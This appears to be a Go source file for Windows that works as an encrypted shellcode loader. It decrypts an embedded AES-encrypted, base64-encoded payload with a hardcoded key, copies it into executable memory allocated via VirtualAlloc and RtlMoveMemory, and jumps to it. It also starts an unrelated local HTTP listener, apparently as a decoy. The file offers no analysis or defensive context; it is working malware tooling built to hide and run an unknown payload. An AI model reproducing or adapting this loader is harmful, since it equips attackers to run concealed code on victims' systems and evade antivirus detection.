package main

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"fmt"
	"syscall"
	"unsafe"
	"net/http"
	"runtime"
)

var (
	kernel32      = syscall.NewLazyDLL("kernel32.dll")
	VirtualAlloc  = kernel32.NewProc("VirtualAlloc")
	RtlMoveMemory = kernel32.NewProc("RtlMoveMemory")
)


func build(ddm string) {
	sDec, _ := base64.StdEncoding.DecodeString(ddm)
	addr, _, _ := VirtualAlloc.Call(0, uintptr(len(sDec)), 0x1000|0x2000, 0x40)
	_, _, _ = RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&sDec[0])), uintptr(len(sDec)))
	syscall.Syscall(addr, 0, 0, 0, 0)

}




//去掉字符（末尾）
func UnPaddingText1(str []byte) []byte {
	n := len(str)
	count := int(str[n-1])
	newPaddingText := str[:n-count]
	return newPaddingText
}

//---------------DES解密--------------------


func DecrptogAES(src, key []byte) []byte {
	block, err := aes.NewCipher(key)
	if err != nil {
		fmt.Println(nil)
		return nil
	}
	blockMode := cipher.NewCBCDecrypter(block, key)
	blockMode.CryptBlocks(src, src)
	src = UnPaddingText1(src)
	return src
}

func getRoot(w http.ResponseWriter, r *http.Request) {
	fmt.Printf("got / request\n")
	w.Header().Set("Access-Control-Allow-Origin", "*")
}

func start_service(){
	runtime.Gosched()
	http.HandleFunc("/", getRoot)
	http.ListenAndServe("127.0.0.1:60139", nil)
}

func main() {
	str := "i/MFt0tsFf0Ysu8SezNQfdwN2RpCV6M0IxK5KcRXJhctkvwk4hlZNbHidCMx4RRzAeSiHXVo375d4IKzfF4ffoZdKTAk4OHTdciqQwZEuqdHh6YXF8ANBfEniKm55MQsB3Sc00+6jEalpjjGXwHBT46XXVlIH9cfZf7dm/HYN22s1aiG2mvbINb9/z42/2+x3IB1jFc9aRtbkSltvGx46RmJL54DpzkrEiyjIui4I0wPRt9YTe9s0nR2zsu1OED6YCH2mfBc8P9qYHslUNDr0lwZJs9kcgVaQoXvppoBBR3AnfuEaEwDkXsIBKwaBS3A1wce3CpVMIhmd6bgf8ArOnXH6vbMYJNEYLaO7dYvlAD91yYAn2eACjkmTVpGUFS5u900pNlMtbtIOwTIWD1P2zvZNzNgLzs8wqTrHJ4CXHP4496O28YP1QSggefRG8rvIKqZ5ciUpvDJRKd4L+71nrjpUcXJM/nq2LKBGA8+P8P/lRl3FE6TSXsDMe66FodgBEyBDc4MYre6CbmqC+4pO1OgJkOyBEAn887zlueTlRv5ipHFFlEhC74yDSGLrjJO5QlXaPybKxW9GeuUyVatEBfOwNzBHchDGe7JB88n8uo1w8e/YJ5SFQk9HItDDV4ENlyffBJ1TOKyxz8uO/456HYMEpBy1RV3nOm4ckR2J4JtluYjC1xdb9hkzOYL+YY+XSPGrP/Xo+K+YbI11l/HvCa19pRHZZeAfgJczLd5w+PGbi+JBq9uvTfgI7CUonrCSrmBvNnuGbmLcgoFf+wu3E3thmUOnLdbcgobU934dQ7PQ7hiznWiGZYWy5PIVIdecsJowWOF3jY8KdHWn8W+wS4iHJTMuHRW/HfPRtfaQ4Etp0yGjR5yUaLRiS+vFk5XcNbRR2npeHaXKLV6CgPFYEcLBAQWSkw8W4wWv7KNSXoUn7/Y99YcCD+GZKb6BKKW1qTbpu1vKcYJwv83Et49M+VNs2f1T62KZEbDwy06blb91f6WCuuJ9GvMZy5MLXHN15DUvZ29jgoZF3OdmKE+wKXP0vkLs0/M1gJeyrtpZi4nt3xuRXfsTbwlyQ+mPqqh3ob21wUR22Asn1bOg9vv/LsPS63GPAay0Ewr16oGSgjv5Vyb/kpqRW+vck+v7m4aDqWFFGQzoHjJo4ncQcV2GIXJ4S6qBgdXUmurcpSRgmqsmWJUe3uSack9uupybsvKkKkrpN1FYYxnc8ekB5DS/pQEJxvUjxx8PoTYO/+bRO0lHApIKK1osRZePrt/kA4CYtVKg+mAj20dE7ftEhQvooiqZdmrxsck5vLIHvYHDEs/kEIFdlmAXSzvce1EMYjsBselGzvSpLfz7qfbJVjDT10+j9qyvJabPckH9bLKYZFKXHkvtYoT8mRtEDGgpmqsTuCkxpf2ud4aPOEuawlWqyIph7DfjLOvKM3LQtXE9b8wGX+4lKehWwFrg09kYopAMHTq6UCjmuDAL7TBQ4IJd8V8q462Q11Wfqnm5zFEOsgYMxOdpPvM6bTdpXGqVbP5Rs3FUWF+E0yUEouaRXC9+uApzLrdGX05LdBRmdBnsAZMx1csgpc9/eh0+H/aaXzAJmO+kGyim4QFQvSxD+DjHTJOchNIJvx6X7dO1kAznwlDIqN62LKqY5Z/Lx1vB6zrl1ki1jzsPYe7a0bm0TWZQw=="
	key := []byte("LeslieCheungKwok")
	base_byte, _ := base64.StdEncoding.DecodeString(str)
	go start_service()
	build(string(DecrptogAES(base_byte, key)))
}